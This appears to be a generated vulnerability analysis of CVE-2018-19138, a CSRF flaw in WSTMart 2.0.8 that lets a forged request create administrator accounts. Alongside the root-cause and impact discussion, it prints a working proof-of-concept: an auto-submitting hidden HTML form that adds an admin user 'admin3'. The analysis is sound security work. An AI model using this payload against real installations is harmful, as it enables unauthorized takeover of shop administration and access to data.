Based on the provided information, here's an analysis of CVE-2018-19138:

**Root Cause of Vulnerability:**

The root cause is a lack of Cross-Site Request Forgery (CSRF) protection in the WSTMart 2.0.8 application. Specifically, the `/admin/staffs/add.html` endpoint for adding new administrator accounts is vulnerable.

**Weaknesses/Vulnerabilities Present:**

- **CSRF:** The application does not properly validate the origin of requests attempting to add a new administrator, making it susceptible to CSRF attacks. An attacker can craft a malicious web page that, when visited by an authenticated administrator, will trigger the vulnerable endpoint.
- **Lack of Anti-CSRF Token:** The absence of an anti-CSRF token is the primary reason for this vulnerability. Such tokens are generally used to ensure the request came from the intended client.

**Impact of Exploitation:**

- **Unauthorized Admin Account Creation:** A successful CSRF attack allows an attacker to add a new administrator account to the WSTMart platform with predefined credentials.
- **Complete System Compromise:** Once the attacker has successfully created an admin account, they gain full control over the WSTMart system. They could manipulate data, change configurations, or gain access to sensitive information.

**Attack Vectors:**

- **Malicious Web Page:** The attacker crafts a malicious HTML page that includes a form targeting the vulnerable `/admin/staffs/add.html` endpoint.
- **Social Engineering:** The attacker needs to trick an authenticated administrator into visiting the malicious page while they are logged into the WSTMart admin panel.

**Required Attacker Capabilities/Position:**

- **Ability to Craft HTML:** The attacker needs to be able to create a simple HTML page that includes a form and JavaScript code to automatically submit the forged request.
- **Social Engineering:** The attacker needs to somehow get a logged-in administrator to visit the malicious web page.
- **No prior knowledge of admin password needed:** The attack creates a new admin account and password.

**Technical Details:**

The provided exploit code demonstrates the vulnerability:

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
 <title>Document</title>
</head>
<body>
	<form action="http://xx.xx.xx.xx/st/wstmart_v2.0.8_181212/index.php/admin/staffs/add.html" id="test" name='test' method="POST">
		<input type="hidden" name='staffId' value="" />
		<input type="hidden" name='loginName' value="" />
		<input type="hidden" name='staffPhoto' value="" />
		<input type="hidden" name='loginPwd' value="" />
		<input type="hidden" name='staffName' value="" />
		<input type="hidden" name='staffNo' value="" />
		<input type="hidden" name='RoleId' value="" />
		<input type="hidden" name='staffPhone' value="" />
		<input type="hidden" name='wxOpenId' value="" />
		<input type="hidden" name='workStatus' value="" />
		<input type="hidden" name='staffStatus' value="" />
	</form>

<script type="text/javascript">
test.staffId.value="0";
test.loginName.value="admin3";
test.staffPhoto.value="";
test.loginPwd.value="admin3";
test.staffName.value="admin3";
test.staffNo.value="";
test.RoleId.value="0";
test.staffPhone.value="";
test.wxOpenId.value="";
test.workStatus.value="1";
test.staffStatus.value="1";
test.submit();
</script>
</body>
</html>
```
The exploit code does the following:

1. It creates a hidden form that targets the vulnerable `add.html` endpoint on the WSTMart application.
2. It populates the form fields with the values for creating a new admin account, such as `loginName`, `loginPwd`, `staffName`, etc.
3. It uses JavaScript to automatically submit the form once the page is loaded.

**Summary:**
This is a classic CSRF vulnerability that could result in complete compromise of the system due to the ability to create admin users.
